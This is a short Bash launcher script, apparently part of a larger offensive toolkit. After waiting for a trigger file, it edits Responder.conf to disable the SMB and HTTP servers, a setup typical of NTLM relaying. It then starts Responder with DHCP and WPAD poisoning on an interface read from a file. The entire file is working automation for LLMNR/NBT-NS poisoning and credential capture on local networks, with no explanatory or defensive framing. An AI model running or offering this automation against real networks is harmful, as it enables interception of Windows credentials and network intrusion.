#!/usr/bin/env bash

LBlue='\033[0;94m'      # Ligth Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [ ! -f .attack ];do
    clear
    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Responder...${Color_Off}\n"
    sleep 5
done

IFACE=$(cat iface.txt)

# Modificando parametros de Responder.conf
perl -pi -e "s[SMB = On][SMB = Off]g" /usr/share/responder/Responder.conf
perl -pi -e "s[HTTP = On][HTTP = Off]g" /usr/share/responder/Responder.conf

# Iniciando Responder
responder -I $IFACE -dw

sleep 5